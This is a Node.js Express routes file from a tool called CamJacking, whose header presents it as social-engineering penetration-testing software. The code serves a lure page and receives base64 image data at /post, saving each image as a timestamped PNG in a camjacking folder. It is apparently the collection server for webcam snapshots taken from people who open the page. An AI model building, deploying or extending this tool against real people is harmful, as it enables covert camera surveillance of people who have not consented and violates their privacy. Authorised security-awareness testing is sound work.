/**
 * CamJacking
 * CamJacking is a tool designed for use in human penetration testing tool. It is intended to simulate potential security threats by testing the negligence of people, and is used to identify weaknesses in an organization's security infrastructure. By using CamJacking, security professionals can gain a better understanding of their organization's potential risks and take proactive measures to improve their security posture.
 *
 * @author karthikeyan V (karthithehacker) <https://karthithehacker.com>
 */
//lib and includes section 
const express = require("express");
const routes = express.Router();
const fs = require("fs");
const os = require("os");

// get the home directory path
const homeDir = os.homedir();

let data;

var currentTime = new Date();
var currentOffset = currentTime.getTimezoneOffset();
var ISTOffset = 330;
var date_time = new Date(currentTime.getTime() + (ISTOffset + currentOffset)*60000);
var hoursIST = date_time.getHours()



routes.get('/',(req,res)=>{    
    res.render('index.ejs');
})

routes.post('/post', (req, res) => {
  const date = new Date().toISOString().replace(/[:.]/g, "");
  const imageData = req.body.cat;

  if (imageData) {
    console.log("Received");
    const filteredData = imageData.split(";base64,").pop();
    const unencodedData = Buffer.from(filteredData, "base64");
    const fileName = `cam${date}.png`;
   
    fs.writeFile(homeDir+"/camjacking/"+fileName, unencodedData, (err) => {
      if (err) {
        console.error(err);
        res.status(500).send('Error saving image');
      } else {
        console.log("Image saved into "+homeDir+"/camjacking/"+fileName);
        res.send({ message: 'Image saved successfully' });
      }
    });
    
  } else {
    res.status(400).send('No image data received');
  }
});

module.exports = routes;